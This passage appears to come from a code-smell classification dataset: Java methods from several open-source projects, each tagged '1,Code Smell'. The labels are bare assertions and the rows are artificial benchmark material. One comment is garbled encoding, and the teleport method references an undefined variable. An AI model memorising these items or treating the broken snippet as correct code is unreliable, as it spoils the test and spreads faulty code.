          getMessagesStorage().closeHolesInMedia(uid,minId,max_id,type,topicId);
        }
 else {
          getMessagesStorage().closeHolesInMedia(uid,minId,Integer.MAX_VALUE,type,topicId);
        }
      }
      getMessagesStorage().getDatabase().commitTransaction();
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
  }
);
}",1,Code Smell
"public void add(ClassEntity entity){
  add(entity,false);
}
public void add(ClassEntity entity,boolean fromCache){
  final Node current=getOrPutEmpty((entity.access & Opcodes.ACC_INTERFACE) != 0,entity.name);
  if (!current.defined.compareAndSet(false,true)) {
    if (fromCache) {
      return;
    }
    if (!entity.fromAndroid && !isCacheValid()) {
      String msg=String.format(""We found duplicate %s class files in the project."",current.entity.name);
      if (BooleanProperty.ENABLE_DUPLICATE_CLASS_CHECK.value() && !""module-info"".equals(current.entity.name)) {
        throw new DuplicateClassException(msg);
      }
 else {
        LevelLog.sDefaultLogger.e(msg);
      }
    }
  }
  ClassNode superNode=null;
  List<InterfaceNode> interfaceNodes=Collections.emptyList();
  if (entity.superName != null) {
    Node node=getOrPutEmpty(false,entity.superName);
    if (node instanceof ClassNode) {
      superNode=(ClassNode)node;
      if (current instanceof ClassNode) {
synchronized (superNode) {
          if (superNode.children == Collections.EMPTY_LIST) {
            superNode.children=new LinkedList<>();
          }
          superNode.children.add((ClassNode)current);
        }
      }
    }
 else {
      throw new RuntimeException(String.format(""%s is not a class. Maybe there are duplicate class files in the project."",entity.superName));
    }
  }
  if (entity.interfaces.size() > 0) {
    interfaceNodes=entity.interfaces.stream().map(i -> {
      Node node=getOrPutEmpty(true,i);
      if (node instanceof InterfaceNode) {
        final InterfaceNode interfaceNode=(InterfaceNode)node;
synchronized (interfaceNode) {
          if (current instanceof InterfaceNode) {
            if (interfaceNode.children == Collections.EMPTY_LIST) {
              interfaceNode.children=new LinkedList<>();
            }
            interfaceNode.children.add((InterfaceNode)current);
          }
 else           if (current instanceof ClassNode) {
            if (interfaceNode.implementedClasses == Collections.EMPTY_LIST) {
              interfaceNode.implementedClasses=new LinkedList<>();
            }
            interfaceNode.implementedClasses.add((ClassNode)current);
          }
        }
        return (InterfaceNode)node;
      }
 else {
        throw new RuntimeException(String.format(""%s is not a interface. Maybe there are duplicate class files in the project."",i));
      }
    }
).collect(Collectors.toList());
  }
  current.entity=entity;
  current.parent=superNode;
  current.interfaces=interfaceNodes;
}",1,Code Smell
"private void updateTimeline(){
  if (player == null) {
    return;
  }
  multiWindowTimeBar=showMultiWindowTimeBar && canShowMultiWindowTimeBar(player.getCurrentTimeline(),window);
  currentWindowOffset=0;
  long durationUs=0;
  int adGroupCount=0;
  Timeline timeline=player.getCurrentTimeline();
  if (!timeline.isEmpty()) {
    int currentWindowIndex=player.getCurrentWindowIndex();
    int firstWindowIndex=multiWindowTimeBar ? 0 : currentWindowIndex;
    int lastWindowIndex=multiWindowTimeBar ? timeline.getWindowCount() - 1 : currentWindowIndex;
    for (int i=firstWindowIndex; i <= lastWindowIndex; i++) {
      if (i == currentWindowIndex) {
        currentWindowOffset=C.usToMs(durationUs);
      }
      timeline.getWindow(i,window);
      if (window.durationUs == C.TIME_UNSET) {
        Assertions.checkState(!multiWindowTimeBar);
        break;
      }
      for (int j=window.firstPeriodIndex; j <= window.lastPeriodIndex; j++) {
        timeline.getPeriod(j,period);
        int periodAdGroupCount=period.getAdGroupCount();
        for (int adGroupIndex=0; adGroupIndex < periodAdGroupCount; adGroupIndex++) {
          long adGroupTimeInPeriodUs=period.getAdGroupTimeUs(adGroupIndex);
          if (adGroupTimeInPeriodUs == C.TIME_END_OF_SOURCE) {
            if (period.durationUs == C.TIME_UNSET) {
              continue;
            }
            adGroupTimeInPeriodUs=period.durationUs;
          }
          long adGroupTimeInWindowUs=adGroupTimeInPeriodUs + period.getPositionInWindowUs();
          if (adGroupTimeInWindowUs >= 0 && adGroupTimeInWindowUs <= window.durationUs) {
            if (adGroupCount == adGroupTimesMs.length) {
              int newLength=adGroupTimesMs.length == 0 ? 1 : adGroupTimesMs.length * 2;
              adGroupTimesMs=Arrays.copyOf(adGroupTimesMs,newLength);
              playedAdGroups=Arrays.copyOf(playedAdGroups,newLength);
            }
            adGroupTimesMs[adGroupCount]=C.usToMs(durationUs + adGroupTimeInWindowUs);
            playedAdGroups[adGroupCount]=period.hasPlayedAdGroup(adGroupIndex);
            adGroupCount++;
          }
        }
      }
      durationUs+=window.durationUs;
    }
  }
  long durationMs=C.usToMs(durationUs);
  if (durationView != null) {
    durationView.setText(Util.getStringForTime(formatBuilder,formatter,durationMs));
  }
  if (timeBar != null) {
    timeBar.setDuration(durationMs);
    int extraAdGroupCount=extraAdGroupTimesMs.length;
    int totalAdGroupCount=adGroupCount + extraAdGroupCount;
    if (totalAdGroupCount > adGroupTimesMs.length) {
      adGroupTimesMs=Arrays.copyOf(adGroupTimesMs,totalAdGroupCount);
      playedAdGroups=Arrays.copyOf(playedAdGroups,totalAdGroupCount);
    }
    System.arraycopy(extraAdGroupTimesMs,0,adGroupTimesMs,adGroupCount,extraAdGroupCount);
    System.arraycopy(extraPlayedAdGroups,0,playedAdGroups,adGroupCount,extraAdGroupCount);
    timeBar.setAdGroupTimesMs(adGroupTimesMs,playedAdGroups,totalAdGroupCount);
  }
  updateProgress();
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite private static void performTeleport(CommandSourceStack source,Entity entity,ServerLevel level,double x,double y,double z,Set<RelativeMovement> set,float yaw,float pitch,@Nullable TeleportCommand.LookAt p_139024_) throws CommandSyntaxException {
  var event=((EntityBridge)entity).bridge$onEntityTeleportCommand(x,y,z);
  if (event._1) {
    return;
  }
  x=event._2;
  y=event._3;
  z=event._4;
  BlockPos blockpos=BlockPos.containing(x,y,z);
  if (!Level.isInSpawnableBounds(blockpos)) {
    throw INVALID_POSITION.create();
  }
 else {
    float f=Mth.wrapDegrees(yaw);
    float f1=Mth.wrapDegrees(pitch);
    boolean result;
    if (entity instanceof ServerPlayer) {
      ((ServerPlayerEntityBridge)player).bridge$pushChangeDimensionCause(PlayerTeleportEvent.TeleportCause.COMMAND);
      result=player.teleportTo(level,x,y,z,set,f,f1);
    }
 else {
      Location to=new Location(((ServerWorldBridge)level).bridge$getWorld(),x,y,z,yaw,pitch);
      var e=new org.bukkit.event.entity.EntityTeleportEvent(((EntityBridge)entity).bridge$getBukkitEntity(),((EntityBridge)entity).bridge$getBukkitEntity().getLocation(),to);
      Bukkit.getPluginManager().callEvent(e);
      if (e.isCancelled()) {
        return;
      }
      x=to.getX();
      y=to.getY();
      z=to.getZ();
      f=to.getYaw();
      f1=to.getPitch();
      level=((CraftWorld)to.getWorld()).getHandle();
      result=entity.teleportTo(level,x,y,z,set,f,f1);
    }
    if (result) {
      if (p_139024_ != null) {
        p_139024_.perform(source,entity);
      }
      label23: {
        if (entity instanceof LivingEntity) {
          LivingEntity livingentity=(LivingEntity)entity;
          if (livingentity.isFallFlying()) {
            break label23;
          }
        }
        entity.setDeltaMovement(entity.getDeltaMovement().multiply(1.0D,0.0D,1.0D));
        entity.setOnGround(true);
      }
      if (entity instanceof PathfinderMob) {
        PathfinderMob pathfindermob=(PathfinderMob)entity;
        pathfindermob.getNavigation().stop();
      }
    }
  }
}",1,Code Smell
"/** 
 * 澶勭悊琚� disable 鎺夌殑杈� 1. 灏嗕粎鑳介�氳繃琚� disable 鎺夌殑杈瑰彲杈剧殑鑺傜偣鏍囪涓� disable锛坉isableByControlNode锛夛紝灏嗙姸鎬佹洿鏂颁负宸插彇娑� 2. 灏嗚繖浜涜 disable 鎺夌殑鑺傜偣鐨勫嚭鍙ｈ竟閮芥爣璁颁负 disable 3. 閫掑綊璋冪敤鑷韩锛岀户缁鐞嗚 disable 鐨勮竟
 */
@SuppressWarnings(""squid:S3776"") public static void handleDisableEdges(List<PEWorkflowDAG.Edge> disableEdges,WorkflowDAG dag){
  if (disableEdges.isEmpty()) {
    return;
  }
  List<PEWorkflowDAG.Node> disableNodes=Lists.newArrayList();
  for (  PEWorkflowDAG.Edge disableEdge : disableEdges) {
    WorkflowDAG.Node toNode=dag.getNode(disableEdge.getTo());
    Collection<PEWorkflowDAG.Edge> dependenceEdges=toNode.getDependenceEdgeMap().values();
    boolean shouldBeDisable=true;
    for (    PEWorkflowDAG.Edge dependenceEdge : dependenceEdges) {
      if (dependenceEdge.getEnable() == null || dependenceEdge.getEnable()) {
        shouldBeDisable=false;
        break;
      }
    }
    if (shouldBeDisable) {
      PEWorkflowDAG.Node node=toNode.getHolder();
      node.setEnable(false).setDisableByControlNode(true).setStatus(InstanceStatus.CANCELED.getV());
      disableNodes.add(node);
    }
  }
  if (!disableNodes.isEmpty()) {
    List<PEWorkflowDAG.Edge> targetEdges=Lists.newArrayList();
    for (    PEWorkflowDAG.Node disableNode : disableNodes) {
      WorkflowDAG.Node node=dag.getNode(disableNode.getNodeId());
      Collection<PEWorkflowDAG.Edge> edges=node.getSuccessorEdgeMap().values();
      for (      PEWorkflowDAG.Edge edge : edges) {
        edge.setEnable(false);
        targetEdges.add(edge);
      }
    }
    handleDisableEdges(targetEdges,dag);
  }
}",1,Code Smell
"public boolean step(MediaCodecVideoConvertor.Muxer muxer,int audioTrackIndex) throws Exception {
  if (!encoderInputDone) {
    int encoderBufferIndex=encoder.dequeueInputBuffer(TIMEOUT_USEC);
    if (encoderBufferIndex >= 0) {
      if (isInputAvailable()) {
        ShortBuffer encoderBuffer;
        if (Build.VERSION.SDK_INT >= 21) {
          encoderBuffer=encoder.getInputBuffer(encoderBufferIndex).asShortBuffer();
        }
 else {
          encoderBuffer=encoder.getInputBuffers()[encoderBufferIndex].asShortBuffer();
        }
        mix(encoderBuffer);
        encoder.queueInputBuffer(encoderBufferIndex,0,encoderBuffer.position() * BYTES_PER_SHORT,encoderInputPresentationTimeUs,MediaCodec.BUFFER_FLAG_KEY_FRAME);
        encoderInputPresentationTimeUs+=AudioConversions.shortsToUs(encoderBuffer.position(),sampleRate,channelCount);
      }
 else {
        encoder.queueInputBuffer(encoderBufferIndex,0,0,0,MediaCodec.BUFFER_FLAG_END_OF_STREAM);
        encoderInputDone=true;
      }
    }
  }
  if (!encoderDone) {
    int encoderOutputBufferIndex=encoder.dequeueOutputBuffer(encoderOutputBufferInfo,TIMEOUT_USEC);
    if (encoderOutputBufferIndex == MediaCodec.INFO_TRY_AGAIN_LATER) {
      return encoderDone;
    }
    if (encoderOutputBufferIndex == MediaCodec.INFO_OUTPUT_BUFFERS_CHANGED) {
      encoderOutputBuffers=encoder.getOutputBuffers();
    }
    if (encoderOutputBufferIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
      return encoderDone;
    }
    ByteBuffer encoderOutputBuffer=encoderOutputBuffers[encoderOutputBufferIndex];
    if ((encoderOutputBufferInfo.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) {
      encoder.releaseOutputBuffer(encoderOutputBufferIndex,false);
      return encoderDone;
    }
    if (encoderOutputBufferInfo.size != 0) {
      muxer.writeSampleData(audioTrackIndex,encoderOutputBuffer,encoderOutputBufferInfo,false);
    }
    if ((encoderOutputBufferInfo.flags & MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) {
      encoderDone=true;
    }
    encoder.releaseOutputBuffer(encoderOutputBufferIndex,false);
  }
  return encoderDone;
}",1,Code Smell
"@Override public void groupTransferRouter(List<ModuleGroup> groups,List<ModuleGroupSort> groupSorts,Map<Long,Long> oldNewModuleIdMap,List<ModuleEntity> modules,Long applicationId,List<Router> routers){
  Map<Long,ModuleGroup> groupIdEntityMap=Optional.ofNullable(groups).map(g -> g.stream().collect(Collectors.toMap(ModuleGroup::getId,Function.identity()))).orElse(new HashMap<>());
  Map<Long,ModuleEntity> moduleIdEntityMap=modules.stream().collect(Collectors.toMap(ModuleEntity::getModuleId,Function.identity()));
  if (CollUtil.isNotEmpty(groupSorts)) {
    List<ModuleGroupSort> parents=groupSorts.stream().filter(g -> ObjectUtil.isNull(g.getGroupId()) || ObjectUtil.isNull(g.getModuleId())).sorted(Comparator.comparing(ModuleGroupSort::getSort)).collect(Collectors.toList());
    AtomicInteger atomicInteger=new AtomicInteger(0);
    for (    ModuleGroupSort groupSort : parents) {
      Long routerId=BaseUtil.getNextId();
      Router router=this.transferRouter(groupIdEntityMap,moduleIdEntityMap,oldNewModuleIdMap,groupSort,routerId,applicationId);
      if (ObjectUtil.isNull(router)) {
        continue;
      }
      router.setSort(atomicInteger.getAndIncrement());
      routers.add(router);
      if (ObjectUtil.isNotNull(groupSort.getGroupId())) {
        List<ModuleGroupSort> groupModules=groupSorts.stream().filter(g -> ObjectUtil.equal(groupSort.getGroupId(),g.getGroupId()) && ObjectUtil.isNotNull(g.getModuleId())).sorted(Comparator.comparing(ModuleGroupSort::getSort)).collect(Collectors.toList());
        if (CollUtil.isNotEmpty(groupModules)) {
          for (          ModuleGroupSort groupModule : groupModules) {
            Router subRouter=this.transferRouter(groupIdEntityMap,moduleIdEntityMap,oldNewModuleIdMap,groupModule,routerId,applicationId);
            if (ObjectUtil.isNotNull(subRouter)) {
              subRouter.setSort(atomicInteger.getAndIncrement());
              subRouter.setParentId(routerId);
              routers.add(subRouter);
            }
          }
        }
      }
    }
  }
}",1,Code Smell
"/** 
 * Creates a map of the classes fields.
 */
protected HashMap<String,FieldDeserializer> getFieldMap(Class<?> cl){
  HashMap<String,FieldDeserializer> fieldMap=new HashMap<String,FieldDeserializer>();
  for (; cl != null; cl=cl.getSuperclass()) {
    Field[] fields=cl.getDeclaredFields();
    for (int i=0; i < fields.length; i++) {
      Field field=fields[i];
      if (Modifier.isTransient(field.getModifiers()) || Modifier.isStatic(field.getModifiers()))       continue;
 else       if (fieldMap.get(field.getName()) != null)       continue;
      try {
        field.setAccessible(true);
      }
 catch (      Throwable e) {
        e.printStackTrace();
      }
      Class<?> type=field.getType();
      FieldDeserializer deser;
      if (String.class.equals(type)) {
        deser=new StringFieldDeserializer(field);
      }
 else       if (byte.class.equals(type)) {
        deser=new ByteFieldDeserializer(field);
      }
 else       if (char.class.equals(type)) {
        deser=new CharFieldDeserializer(field);
      }
 else       if (short.class.equals(type)) {
        deser=new ShortFieldDeserializer(field);
      }
 else       if (int.class.equals(type)) {
        deser=new IntFieldDeserializer(field);
      }
 else       if (long.class.equals(type)) {
        deser=new LongFieldDeserializer(field);
      }
 else       if (float.class.equals(type)) {
        deser=new FloatFieldDeserializer(field);
      }
 else       if (double.class.equals(type)) {
        deser=new DoubleFieldDeserializer(field);
      }
 else       if (boolean.class.equals(type)) {
        deser=new BooleanFieldDeserializer(field);
      }
 else       if (java.sql.Date.class.equals(type)) {
        deser=new SqlDateFieldDeserializer(field);
      }
 else       if (java.sql.Timestamp.class.equals(type)) {
        deser=new SqlTimestampFieldDeserializer(field);
      }
 else       if (java.sql.Time.class.equals(type)) {
        deser=new SqlTimeFieldDeserializer(field);
      }
 else {
        deser=new ObjectFieldDeserializer(field);
      }
      fieldMap.put(field.getName(),deser);
    }
  }
  return fieldMap;
}",1,Code Smell
"/** 
 * Creates a map of the classes fields.
 */
protected HashMap getMethodMap(Class cl){
  HashMap methodMap=new HashMap();
  for (; cl != null; cl=cl.getSuperclass()) {
    Method[] methods=cl.getDeclaredMethods();
    for (int i=0; i < methods.length; i++) {
      Method method=methods[i];
      if (Modifier.isStatic(method.getModifiers()))       continue;
      String name=method.getName();
      if (!name.startsWith(""set""))       continue;
      Class[] paramTypes=method.getParameterTypes();
      if (paramTypes.length != 1)       continue;
      if (!method.getReturnType().equals(void.class))       continue;
      if (findGetter(methods,name,paramTypes[0]) == null)       continue;
      try {
        method.setAccessible(true);
      }
 catch (      Throwable e) {
        e.printStackTrace();
      }
      name=name.substring(3);
      int j=0;
      for (; j < name.length() && Character.isUpperCase(name.charAt(j)); j++) {
      }
      if (j == 1)       name=name.substring(0,j).toLowerCase(Locale.ENGLISH) + name.substring(j);
 else       if (j > 1)       name=name.substring(0,j - 1).toLowerCase(Locale.ENGLISH) + name.substring(j - 1);
      methodMap.put(name,method);
    }
  }
  return methodMap;
}",1,Code Smell
"private void validateSinkMultiple(DataType physicalDataType,boolean multipleSink,String sinkMultipleFormat,String databasePattern,String tablePattern,boolean enableSchemaChange,String schemaChangePolicies){
  if (multipleSink) {
    if (StringUtils.isBlank(databasePattern)) {
      throw new ValidationException(""The option 'sink.multiple.database-pattern'"" + "" is not allowed blank when the option 'sink.multiple.enable' is 'true'"");
    }
    if (StringUtils.isBlank(tablePattern)) {
      throw new ValidationException(""The option 'sink.multiple.table-pattern' "" + ""is not allowed blank when the option 'sink.multiple.enable' is 'true'"");
    }
    if (StringUtils.isBlank(sinkMultipleFormat)) {
      throw new ValidationException(""The option 'sink.multiple.format' "" + ""is not allowed blank when the option 'sink.multiple.enable' is 'true'"");
    }
    DynamicSchemaFormatFactory.getFormat(sinkMultipleFormat);
    Set<String> supportFormats=DynamicSchemaFormatFactory.SUPPORT_FORMATS.keySet();
    if (!supportFormats.contains(sinkMultipleFormat)) {
      throw new ValidationException(String.format(""Unsupported value '%s' for '%s'. "" + ""Supported values are %s."",sinkMultipleFormat,SINK_MULTIPLE_FORMAT.key(),supportFormats));
    }
    if (physicalDataType.getLogicalType() instanceof VarBinaryType) {
      throw new ValidationException(""Only supports 'BYTES' or 'VARBINARY(n)' of PhysicalDataType "" + ""when the option 'sink.multiple.enable' is 'true'"");
    }
    if (enableSchemaChange) {
      Map<SchemaChangeType,SchemaChangePolicy> policyMap=SchemaChangeUtils.deserialize(schemaChangePolicies);
      for (      Entry<SchemaChangeType,SchemaChangePolicy> kv : policyMap.entrySet()) {
        List<SchemaChangePolicy> policies=SUPPORTS_POLICY_MAP.get(kv.getKey());
        if (policies == null) {
          throw new ValidationException(String.format(""Unsupported type of schemage-change: %s"",kv.getKey()));
        }
        if (!policies.contains(kv.getValue())) {
          throw new ValidationException(String.format(""Unsupported policy of schemage-change: %s"",kv.getValue()));
        }
      }
    }
  }
}
",1,Code Smell
"private void updateRows(boolean animated){
  oldItems.clear();
  oldItems.addAll(items);
  items.clear();
  ArrayList<TLRPC.TL_dialogFilterSuggested> suggestedFilters=getMessagesController().suggestedFilters;
  ArrayList<MessagesController.DialogFilter> dialogFilters=getMessagesController().getDialogFilters();
  items.add(ItemInner.asHint());
  if (!suggestedFilters.isEmpty() && dialogFilters.size() < 10) {
    items.add(ItemInner.asHeader(LocaleController.getString(""FilterRecommended"",R.string.FilterRecommended)));
    for (int i=0; i < suggestedFilters.size(); ++i) {
      items.add(ItemInner.asSuggested(suggestedFilters.get(i)));
    }
    items.add(ItemInner.asShadow(null));
  }
  if (!dialogFilters.isEmpty()) {
    filtersSectionStart=items.size();
    items.add(ItemInner.asHeader(LocaleController.getString(""Filters"",R.string.Filters)));
    filtersStartPosition=items.size();
    for (int i=0; i < dialogFilters.size(); ++i) {
      items.add(ItemInner.asFilter(dialogFilters.get(i)));
      if (MessagesController.getInstance(currentAccount).folderTags && dialogFilters.get(i).color >= 0) {
        loadedColors=true;
      }
    }
    filtersSectionEnd=items.size();
  }
 else {
    filtersSectionStart=filtersSectionEnd=-1;
  }
  if (dialogFilters.size() < getMessagesController().dialogFiltersLimitPremium) {
    items.add(ItemInner.asButton(LocaleController.getString(""CreateNewFilter"",R.string.CreateNewFilter)));
  }
  items.add(ItemInner.asShadow(null));
  folderTagsPosition=items.size();
  items.add(ItemInner.asCheck(LocaleController.getString(R.string.FolderShowTags)));
  items.add(ItemInner.asShadow(!getUserConfig().isPremium() ? AndroidUtilities.replaceSingleTag(LocaleController.getString(R.string.FolderShowTagsInfoPremium),Theme.key_windowBackgroundWhiteBlueHeader,AndroidUtilities.REPLACING_TAG_TYPE_LINKBOLD,() -> {
    presentFragment(new PremiumPreviewFragment(""settings""));
  }
) : LocaleController.getString(R.string.FolderShowTagsInfo)));
  if (adapter != null) {
    if (animated) {
      adapter.setItems(oldItems,items);
    }
 else {
      adapter.notifyDataSetChanged();
    }
  }
}",1,Code Smell
"public void invalidateTransforms(){
  invalidateTransforms(true);
}
public void invalidateTransforms(boolean applyBackScaleY){
  if (lastToProgress != toProgress || lastTransitionProgress != transitionProgress) {
    if (!onSwipeBackProgressListeners.isEmpty()) {
      for (int i=0; i < onSwipeBackProgressListeners.size(); i++) {
        onSwipeBackProgressListeners.get(i).onSwipeBackProgress(this,toProgress,transitionProgress);
      }
    }
    lastToProgress=toProgress;
    lastTransitionProgress=transitionProgress;
  }
  View backgroundView=getChildAt(0);
  View foregroundView=null;
  if (currentForegroundIndex >= 0 && currentForegroundIndex < getChildCount()) {
    foregroundView=getChildAt(currentForegroundIndex);
  }
  backgroundView.setTranslationX(-transitionProgress * getWidth() * 0.5f);
  float bSc=0.95f + (1f - transitionProgress) * 0.05f;
  backgroundView.setScaleX(bSc);
  backgroundView.setScaleY(bSc);
  if (foregroundView != null) {
    foregroundView.setTranslationX((1f - transitionProgress) * getWidth());
  }
  invalidateVisibility();
  float fW=backgroundView.getMeasuredWidth(), fH=backgroundView.getMeasuredHeight();
  float tW=0;
  float tH=0;
  if (foregroundView != null) {
    tW=foregroundView.getMeasuredWidth();
    tH=overrideForegroundHeight != 0 ? overrideForegroundHeight : foregroundView.getMeasuredHeight();
  }
  if (backgroundView.getMeasuredWidth() == 0 || backgroundView.getMeasuredHeight() == 0) {
    return;
  }
  ActionBarPopupWindow.ActionBarPopupWindowLayout p=(ActionBarPopupWindow.ActionBarPopupWindowLayout)getParent();
  float w=fW + (tW - fW) * transitionProgress;
  float h=fH + (tH - fH) * transitionProgress;
  w+=p.getPaddingLeft() + p.getPaddingRight();
  h+=p.getPaddingTop() + p.getPaddingBottom();
  p.updateAnimation=false;
  p.setBackScaleX(w / p.getMeasuredWidth());
  if (applyBackScaleY) {
    p.setBackScaleY(Math.min(1,h / p.getMeasuredHeight()));
  }
  p.updateAnimation=true;
  for (int i=0; i < getChildCount(); i++) {
    View ch=getChildAt(i);
    ch.setPivotX(0);
    ch.setPivotY(0);
  }
  invalidate();
}",1,Code Smell
"/** 
 * Returns a  {@link Format} that is the same as the input format but includes information from thespecified sources of metadata.
 */
public static Format getFormatWithMetadata(int trackType,Format format,@Nullable Metadata udtaMetadata,@Nullable Metadata mdtaMetadata,GaplessInfoHolder gaplessInfoHolder){
  if (trackType == C.TRACK_TYPE_AUDIO) {
    if (gaplessInfoHolder.hasGaplessInfo()) {
      format=format.copyWithGaplessInfo(gaplessInfoHolder.encoderDelay,gaplessInfoHolder.encoderPadding);
    }
    if (udtaMetadata != null) {
      format=format.copyWithMetadata(udtaMetadata);
    }
  }
 else   if (trackType == C.TRACK_TYPE_VIDEO && mdtaMetadata != null) {
    for (int i=0; i < mdtaMetadata.length(); i++) {
      Metadata.Entry entry=mdtaMetadata.get(i);
      if (entry instanceof MdtaMetadataEntry) {
        MdtaMetadataEntry mdtaMetadataEntry=(MdtaMetadataEntry)entry;
        if (MDTA_KEY_ANDROID_CAPTURE_FPS.equals(mdtaMetadataEntry.key) && mdtaMetadataEntry.typeIndicator == MDTA_TYPE_INDICATOR_FLOAT) {
          try {
            float fps=ByteBuffer.wrap(mdtaMetadataEntry.value).asFloatBuffer().get();
            format=format.copyWithFrameRate(fps);
            format=format.copyWithMetadata(new Metadata(mdtaMetadataEntry));
          }
 catch (          NumberFormatException e) {
            Log.w(TAG,""Ignoring invalid framerate"");
          }
        }
      }
    }
  }
  return format;
}",1,Code Smell
"public static int ways3(int[] arr){
  int N=arr.length;
  int[][][] dp=new int[N][201][3];
  if (arr[0] != 0) {
    dp[0][arr[0]][0]=1;
    dp[0][arr[0]][1]=1;
  }
 else {
    for (int v=1; v < 201; v++) {
      dp[0][v][0]=1;
      dp[0][v][1]=1;
    }
  }
  int[][] presum=new int[201][3];
  for (int v=1; v < 201; v++) {
    for (int s=0; s < 3; s++) {
      presum[v][s]=presum[v - 1][s] + dp[0][v][s];
    }
  }
  for (int i=1; i < N; i++) {
    for (int v=1; v < 201; v++) {
      for (int s=0; s < 3; s++) {
        if (arr[i] == 0 || v == arr[i]) {
          if (s == 0 || s == 1) {
            dp[i][v][s]+=sum(1,v - 1,0,presum);
          }
          dp[i][v][s]+=dp[i - 1][v][1];
          dp[i][v][s]+=sum(v + 1,200,2,presum);
        }
      }
    }
    for (int v=1; v < 201; v++) {
      for (int s=0; s < 3; s++) {
        presum[v][s]=presum[v - 1][s] + dp[i][v][s];
      }
    }
  }
  if (arr[N - 1] != 0) {
    return dp[N - 1][arr[N - 1]][2];
  }
 else {
    return sum(1,200,2,presum);
  }
}",1,Code Smell
"public void destroy(boolean async){
  destroy(async,null);
}
public void destroy(boolean async,Runnable afterCallback){
  isClosed=true;
  if (async) {
    handler.post(() -> {
      if (captureSession != null) {
        captureSession.close();
        captureSession=null;
      }
      if (cameraDevice != null) {
        cameraDevice.close();
        cameraDevice=null;
      }
      if (imageReader != null) {
        imageReader.close();
        imageReader=null;
      }
      thread.quitSafely();
      AndroidUtilities.runOnUIThread(() -> {
        try {
          thread.join();
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
        if (afterCallback != null) {
          afterCallback.run();
        }
      }
);
    }
);
  }
 else {
    if (captureSession != null) {
      captureSession.close();
      captureSession=null;
    }
    if (cameraDevice != null) {
      cameraDevice.close();
      cameraDevice=null;
    }
    if (imageReader != null) {
      imageReader.close();
      imageReader=null;
    }
    thread.quitSafely();
    try {
      thread.join();
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
    if (afterCallback != null) {
      AndroidUtilities.runOnUIThread(afterCallback);
    }
  }
}
",1,Code Smell
"@Override public Response execute(@NonNull Request request) throws IOException, ReCaptchaException {
  String url=request.url();
  RequestBody reqBody=null;
  byte[] dataToSend=request.dataToSend();
  if (dataToSend != null)   reqBody=RequestBody.create(dataToSend,null);
  okhttp3.Request.Builder builder=new okhttp3.Request.Builder().method(request.httpMethod(),reqBody).url(url).addHeader(HttpHeaders.USER_AGENT,Util.CHROME);
  for (  Map.Entry<String,List<String>> pair : request.headers().entrySet()) {
    String headerName=pair.getKey();
    List<String> headerValueList=pair.getValue();
    if (headerValueList.size() > 1) {
      builder.removeHeader(headerName);
      for (      String headerValue : headerValueList)       builder.addHeader(headerName,headerValue);
    }
 else     if (headerValueList.size() == 1) {
      builder.header(headerName,headerValueList.get(0));
    }
  }
  okhttp3.Response response=OkHttp.client().newCall(builder.build()).execute();
  if (response.code() == 429) {
    response.close();
    throw new ReCaptchaException(""reCaptcha Challenge requested"",url);
  }
  String responseBodyToReturn=null;
  ResponseBody resBody=response.body();
  if (resBody != null)   responseBodyToReturn=resBody.string();
  String latestUrl=response.request().url().toString();
  return new Response(response.code(),response.message(),response.headers().toMultimap(),responseBodyToReturn,latestUrl);
}",1,Code Smell
"@Override public void run(){
  try {
    while (FriendIdMap.getCurrentUid() == null || FriendIdMap.getCurrentUid().isEmpty())     Thread.sleep(100);
    String s=AntCooperateRpcCall.queryUserCooperatePlantList();
    if (s == null) {
      Thread.sleep(RandomUtils.delay());
      s=AntCooperateRpcCall.queryUserCooperatePlantList();
    }
    JSONObject jo=new JSONObject(s);
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      int userCurrentEnergy=jo.getInt(""userCurrentEnergy"");
      JSONArray ja=jo.getJSONArray(""cooperatePlants"");
      for (int i=0; i < ja.length(); i++) {
        jo=ja.getJSONObject(i);
        String cooperationId=jo.getString(""cooperationId"");
        if (!jo.has(""name"")) {
          s=AntCooperateRpcCall.queryCooperatePlant(cooperationId);
          jo=new JSONObject(s).getJSONObject(""cooperatePlant"");
        }
        String name=jo.getString(""name"");
        int waterDayLimit=jo.getInt(""waterDayLimit"");
        CooperationIdMap.putIdMap(cooperationId,name);
        if (!Statistics.canCooperateWaterToday(FriendIdMap.getCurrentUid(),cooperationId))         continue;
        int index=-1;
        for (int j=0; j < Config.getCooperateWaterList().size(); j++) {
          if (Config.getCooperateWaterList().get(j).equals(cooperationId)) {
            index=j;
            break;
          }
        }
        if (index >= 0) {
          int num=Config.getcooperateWaterNumList().get(index);
          if (num > waterDayLimit)           num=waterDayLimit;
          if (num > userCurrentEnergy)           num=userCurrentEnergy;
          if (num > 0)           cooperateWater(FriendIdMap.getCurrentUid(),cooperationId,num,name);
        }
      }
    }
 else {
      Log.i(TAG,jo.getString(""resultDesc""));
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""start.run err:"");
    Log.printStackTrace(TAG,t);
  }
  CooperationIdMap.saveIdMap();
}",1,Code Smell
"private ByteBuf writeToBuf5(EncodeObject object){
  ByteBuf buf=null;
  try {
    int totalLength=1 + 4 + 4;
    byte[] body=null;
    if (object.getBodylist() != null && object.getBodylist().size() != 0) {
      ByteArrayOutputStream out=new ByteArrayOutputStream();
      Iterator<byte[]> iter=object.getBodylist().iterator();
      while (iter.hasNext()) {
        byte[] entry=iter.next();
        ByteBuffer byteBuffer=ByteBuffer.allocate(4);
        byteBuffer.putInt(entry.length);
        out.write(byteBuffer.array());
        out.write(entry);
      }
      body=out.toByteArray();
    }
    if (object.getBodyBytes() != null && object.getBodyBytes().length != 0) {
      ByteArrayOutputStream out=new ByteArrayOutputStream();
      ByteBuffer byteBuffer=ByteBuffer.allocate(4);
      byteBuffer.putInt(object.getBodyBytes().length);
      out.write(byteBuffer.array());
      out.write(object.getBodyBytes());
      body=out.toByteArray();
    }
    if (body != null) {
      String msgAttrs=object.getAttributes();
      if (object.isCompress()) {
        body=processCompress(body);
      }
      if (object.isEncrypt()) {
        EncryptConfigEntry encryptEntry=object.getEncryptEntry();
        if (encryptEntry != null) {
          if (Utils.isNotBlank(msgAttrs)) {
            msgAttrs=msgAttrs + ""&"";
          }
          EncryptInfo encryptInfo=encryptEntry.getRsaEncryptInfo();
